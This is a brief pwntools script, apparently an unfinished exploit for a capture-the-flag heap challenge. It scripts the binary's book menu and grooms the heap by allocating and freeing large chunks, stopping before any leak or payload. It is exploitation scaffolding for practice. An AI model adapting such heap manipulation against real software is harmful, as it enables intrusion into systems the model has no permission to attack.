#!/usr/bin/env python3
from pwn import *
exe = ELF('chall', checksec = False)

p = process(exe.path)
# p = remote('', )

def create(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'book: ', str(idx))
    p.sendlineafter(b'book: ', str(size))
    p.sendlineafter(b'book: ', data)

def remove(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'book: ', str(idx))

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'book: ', str(idx))

input()
create(0, 1056, b'aaaaaaaa')
create(1, 1056, b'aaaaaaaa')
create(2, 48, b'aaaaaaaa')

remove(1)
remove(0)

create(0, 1280, b'bbbbbbbb')

p.interactive()